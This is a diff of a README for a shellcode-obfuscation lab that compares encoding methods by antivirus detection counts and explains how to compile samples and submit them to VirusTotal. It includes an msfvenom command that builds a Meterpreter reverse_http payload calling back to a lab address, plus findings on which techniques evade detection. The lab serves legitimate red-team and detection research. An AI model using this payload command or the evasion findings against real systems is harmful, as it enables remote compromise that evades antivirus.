@@ -5,6 +5,15 @@ Shellcode obfuscations laboratory based on RedSiege [Chromatophore](https://gith
 
 ## Results
 
+Tests have been performed with einer "random" - a alphanumeric 20 byte string. And "Metasploit" 
+with output of `msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o beacon.bin`. 
+The "Metasploit" does not execute the shellcode, only decodes and prints it. 
+
+Conclusion: 
+* Encoding/Encryption doesnt matter
+* More important is if a windows API is being used/imported (IAT in PE)
+* Note that NO obfuscation metasploit outperforms AES encryption, base64 windows api, ip-, mac- and uuid-encoding.
+
 
 | **What**           | **Library**           | **Includes**              | **Function / IAT**                 | **Random** | **Metasploit** |
 | ------------------ | --------------------- | ------------------------- | ---------------------------------- | ---------- | -------------- |
@@ -25,11 +34,24 @@ Shellcode obfuscations laboratory based on RedSiege [Chromatophore](https://gith
 | xor_multibyte      | \-                    | \-                        | \-                                 | 1          | 2              |
 | xor_reverse        | \-                    | \-                        | \-                                 | 2          | 3              |
 | xor_single         | \-                    | \-                        | \-                                 | 1          | 3              |
-| No obfuscation     | \-                    | \-                        | \-                                 | 2          | 3              |
+| NO OBFUSCATION     | \-                    | \-                        | \-                                 | 2          | 3              |
 ## Usage
 
 Use the `x64 native tools command prompt` from Visual Studio
 so you have access to `ml.exe` and `Windows.h`. 
 
+To compile all the source into `output/*.exe`:
+```
+> python.exe sol.py compile
+```
+
+To send it to VirusTotal
+
+```
+> set VT_API_KEY=123...
+> python.exe sol.py 
+```
+
+Output is in `output/*.exe.json` and `output/scan_results.txt`. 
 
 
